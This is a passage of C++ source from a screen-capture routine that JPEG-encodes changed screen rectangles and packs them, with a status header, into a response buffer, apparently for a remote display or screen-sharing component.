            Memory::Copy(graphics.rectBuffer + j * rectWidth, graphics.currentScreenshot + (dr.Y + j) * device.Width + dr.X, (USIZE)rectWidth * sizeof(RGB));

        graphics.jpegBuffer.Reset();
        auto encodeResult = JpegEncoder::Encode(JpegCallback, &graphics.jpegBuffer, (INT32)quality, rectWidth, rectHeight, 3, Span<const UINT8>((UINT8 *)graphics.rectBuffer, rectWidth * rectHeight * sizeof(RGB)));
        if (encodeResult.IsErr() || graphics.jpegBuffer.allocationFailed)
        {
            dirtyRects.Free();
            LOG_ERROR("Failed to encode the screenshot for display index: %u", displayIndex);
            WriteErrorResponse(response, responseLength, StatusCode::StatusError);
            return;
        }

        // Grow the packet to fit this entry (x + y + sizeOfData + jpegData);
        // the buffer doubles until it fits, preserving what is already written
        USIZE rectEntrySize = graphics.jpegBuffer.offset + sizeof(UINT32) * 3;
        if (!packet.Resize(packet.Size + rectEntrySize))
        {
            dirtyRects.Free();
            LOG_ERROR("Failed to grow the screenshot packet for display index: %u", displayIndex);
            WriteErrorResponse(response, responseLength, StatusCode::StatusError);
            return;
        }

        // Write the entry into the freshly reserved tail region
        Rectangle rect(dr.X, dr.Y, graphics.jpegBuffer.offset, graphics.jpegBuffer.outputBuffer);
        rect.toBuffer((UINT8 *)packet.Data + packet.Size - rectEntrySize);
    }

    // Copy the current screenshot to the screenshot buffer for the next comparison
    Memory::Copy(graphics.screenshot, graphics.currentScreenshot, device.Width * device.Height * sizeof(RGB));

    // Fill in the response header over the finished packet, then hand the exact
    // accumulated array to the caller (the caller deletes[] *response)
    BinaryWriter writer{Span<UINT8>((UINT8 *)packet.Data, packet.Size)};
    writer.Write<UINT32>(StatusCode::StatusSuccess);
    writer.Write<UINT32>(countOfRects);

    *responseLength = packet.Size;
    *response = packet.Release();

    dirtyRects.Free();
}
